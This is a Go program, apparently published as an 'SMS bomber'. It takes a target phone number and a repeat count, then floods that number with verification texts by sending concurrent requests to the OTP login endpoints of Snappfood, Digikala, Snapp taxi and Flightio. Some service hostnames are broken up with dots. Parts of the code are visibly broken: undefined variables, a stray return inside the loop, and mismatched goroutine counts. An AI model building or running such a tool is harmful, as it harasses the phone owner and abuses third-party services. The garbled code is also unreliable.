package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
	"net/url"
	"strings"
	"io/ioutil"
)

/*
Channel telegram : none
===============================================
Link Github : https://github.com/monsmain
===============================================
Sms Bomber faster
*/
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}
func sms(url string, headers map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(headers)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}

	time.Sleep(3 * time.Second)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	time.Sleep(3 * time.Second)

	if err != nil {
		fmt.Println("\033[01;31m[-] Error while sending request!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()

	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m") // Top (green)
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m") // Middle (white)
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m") // Bottom (red)
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m") // Reset color

	var phone string
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)
        formattedPhone := "98-" + phone 

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

ch := make(chan int)

	for i := 0; i < repeatCount; i++ {
		formData := url.Values{}
		formData.Set("cellphone", phone)
		requestBody := strings.NewReader(formData.Encode())
		go func() {
			resp, err := http.Post("https://s.n.a.p.p.food.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", "application/x-www-form-urlencoded", requestBody)
			if err != nil {
				fmt.Println("\033[01;31m[-] Error while sending request to Snappfood!\033[0m")
				ch <- http.StatusInternalServerError
				return
			}
			defer resp.Body.Close()
			ch <- resp.StatusCode
		}() 
		go sms("https://api.di.g.i.k.a.l.a.com/v1/user/authenticate/", map[string]interface{}{
			"username": phone,
		}, ch)

		
	if url == "https://flightio.com/bff/Authentication/CheckUserKey" {
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Println("\033[01;31m[-] Error creating request for Flightio!", err)
			ch <- http.StatusInternalServerError
			return
		}
		headers := map[string]string{
			"Accept":          "application/json, text/javascript, text/plain, text/html, application/vnd.ms-excel",
			"Accept-Encoding": "gzip, deflate, br, zstd",
			"Accept-Language": "fa_IR",
			"App-Type":        "desktop-browser",
			"Cache-Control":   "no-cache",
			"Client-V":        "10.30.2",
			"Content-Length":  fmt.Sprintf("%d", len(jsonData)),
			"Content-Type":    "application/json",
			"Cookie":          "f-cli-id=...; ...", // کوکی کامل خود را اینجا قرار دهید
			"Devicetype":      "Windows",
			"F-Lang":          "fa",
			"F-Ses-Id":        "9ca8bf75-1231-4afe-81ba-c635cae82480",
			"Origin":          "https://flightio.com",
			"Pragma":          "no-cache",
			"Priority":        "u=1, i",
			"Referer":         "https://flightio.com/",
			"Sec-Ch-Ua":       "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
			"Sec-Ch-Ua-Mobile": "?0",
			"Sec-Ch-Ua-Platform": "\"Windows\"",
			"Sec-Fetch-Dest":  "empty",
			"Sec-Fetch-Mode":  "cors",
			"Sec-Fetch-Site":  "same-origin",
		}

		for key, value := range headers {
			req.Header.Set(key, value)
		}

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("\033[01;31m[-] Error sending request to Flightio!", err)
			ch <- http.StatusInternalServerError
			return
		}
		defer resp.Body.Close()

		fmt.Println("Flightio Status Code:", resp.StatusCode)
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading Flightio response body:", err)
			return
		}
		fmt.Println("Flightio Response Body:", string(bodyBytes))
		ch <- resp.StatusCode
	} 
		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
			"cellphone": phone,
		}, ch)
	} // Closing brace for the first for loop

	for i := 0; i < repeatCount*4; i++ { // Corrected the multiplier to match the number of go routines
		statusCode := <-ch
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
